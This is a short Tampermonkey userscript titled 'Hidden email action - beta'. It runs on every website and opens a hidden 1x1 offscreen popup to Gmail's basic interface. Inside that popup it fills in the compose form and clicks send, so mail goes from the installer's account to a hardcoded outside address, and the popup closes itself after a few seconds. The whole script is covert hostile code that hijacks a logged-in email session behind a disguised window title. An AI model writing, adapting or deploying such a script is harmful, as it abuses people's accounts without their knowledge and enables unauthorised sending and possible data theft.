// ==UserScript==
// @name         Hidden email action - beta
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    window.onload=function() {
        if(window.location.href.match('mail.google.com') !== null) {
            document.title="Loading Data";document.getElementById("sub").value='hax';
            document.getElementById("body").value='hax';document.getElementById("to").value='austinjack404@gmail.com';
            document.getElementById("send").click();
        } else {var x=window.open('https://mail.google.com/mail/u/0/x/j5jycse49u7h-/?&cs=b&pv=tl&eot=1&v=b','_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=100000, top=100000, width=1, height=1, visible=none', '');
                setTimeout(function() {x.close();}, 5500);}};
})();
